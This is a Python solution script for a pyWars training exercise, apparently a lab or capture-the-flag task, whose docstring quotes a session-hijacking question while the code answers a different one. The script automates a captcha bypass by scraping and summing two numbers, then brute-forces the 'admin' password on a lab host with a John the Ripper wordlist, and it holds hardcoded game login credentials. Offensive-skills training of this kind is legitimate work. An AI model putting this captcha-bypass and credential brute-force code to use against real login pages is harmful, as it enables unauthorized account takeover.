'''
>>> game.question(9)
'POINTS:8,TIMED:N - Use session hijacking to access the administrator portal.
To begin read the URL of the target website from the data element. '

>>> game.data(9)
'http://10.10.10.20/sessions.php'

>>> 


'''

import pyWars
import requests
import re
import io

game = pyWars.exercise()
game.login("mleigh","N0Passw0rd")

def captcha(url, s):
    r = s.get(url)
    #print(r.text)
    regex = r'Number\s\d\s:\s(\d+)'
    nums = re.findall(regex,r.text)
    numsum = int(nums[0].encode('ascii')) + int(nums[1].encode('ascii'))
    #print(numsum)
    #r = s.get(data + "?captchaanswer" + str(numsum).encode())
    #print r.text
    #print(str(numsum).encode())
    myobject = {'captchaanswer' : str(numsum).encode()}
    r = s.post(url, data = myobject)
    #print r.text
    

def answer(data):
    url = data
    s = requests.Session()
    captcha(url,s)
    filepath = "/usr/share/john/password.lst"
    with open(filepath) as fp:
        line = fp.readline()
        cnt=1
        while cnt<2500:
            myobject = {'username':'admin', 'password':line.strip()}
            r = s.post(url, data = myobject)
            #print(r.text)
            print("Testing iteration %i : %s" % (cnt,line.strip()))
            if "incorrect" in r.text:
                line = fp.readline()
                cnt+=1
                captcha(data,s)
                continue
            else:
                print(r.text)
                flag = r.text.split("=")
                return flag[1]

        


print(game.answer(8,answer(game.data(8))))
game.logout
